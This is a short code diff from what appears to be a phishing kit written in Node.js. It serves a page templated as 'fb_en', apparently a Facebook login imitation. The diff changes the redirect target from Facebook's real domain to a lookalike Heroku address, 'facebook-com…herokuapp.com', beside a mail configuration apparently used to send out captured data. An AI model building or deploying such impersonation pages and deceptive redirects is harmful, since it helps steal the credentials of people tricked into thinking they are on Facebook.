@@ -36,7 +36,7 @@ var mailOptions = {
 
 
 // #####################################################################################################################################################
-var redirect_link='https://www.fb.com'
+var redirect_link='https://facebook-com1078468519210766.herokuapp.com/'
 
 app.get('/', function (req, res) {
     res.render('fb_en', { redirect_link: redirect_link });
